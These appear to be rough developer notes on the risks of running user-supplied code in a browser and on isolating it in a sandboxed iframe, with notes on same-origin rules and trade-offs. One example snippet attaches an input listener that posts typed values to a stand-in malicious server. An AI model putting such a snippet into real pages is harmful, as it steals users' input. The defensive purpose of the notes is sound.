Code execution

User-provided code might throw errors and cause the program to crash
User-provided code might mutate the DOM, causing our program to crash
document.body.innerHTML = ''
A user might accidentally run code provided by another malicious user
document.querySelector('input').addEventListener('change', (e) => {
  axios.post('malicous.server', {
    value: event.target.value
  })
})

Solution is iFrame



Driect access between frames is allowed when 

The iframe element does not have a 'sandbox' property, or has a 'sandbox='"allow-same-origin" property

AND

We fetch the parent HTML doc and the frame HTML doc forom the exact same 
Domain,
Port, 
Protocol (http vs. https)

trade off
user cannot use local storage of the broswer

but we dont need to make any outside requests. Performance 


big issue

1. maximum size of file when assign large file to iframe srcdoc attibute
